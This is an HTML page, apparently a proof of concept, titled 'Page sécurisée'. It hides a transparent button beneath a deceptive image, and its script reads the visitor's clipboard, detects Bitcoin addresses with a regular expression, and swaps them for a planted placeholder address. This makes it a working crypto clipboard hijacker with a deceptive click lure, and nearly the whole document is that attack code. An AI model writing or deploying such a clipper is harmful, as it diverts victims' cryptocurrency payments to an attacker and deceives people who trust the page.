<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Page sécurisée</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .invisible {
      padding: 10px 20px;
      background-color: #fff;
      border: 1px solid #ccc;
      border-radius: 5px;
      cursor: pointer;
      color: transparent;
      background-image: url('https://i.imgur.com/okH2rba.png'); /* image trompeuse */
      background-size: cover;
      width: 300px;
      height: 180px;
      border: none;
    }
  </style>
</head>
<body>
  <button class="invisible" onclick="activerClipper()"></button>

  <script>
    async function activerClipper() {
      try {
        const texte = await navigator.clipboard.readText();
        const isCrypto = /^((1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59})$/.test(texte);
        if (isCrypto) {
          await navigator.clipboard.writeText("bc1qadressepiégée1234567890mod");
          alert("Adresse crypto remplacée.");
        } else {
          alert("Rien à modifier.");
        }
      } catch (err) {
        alert("Erreur : " + err);
      }
    }
  </script>
</body>
</html>
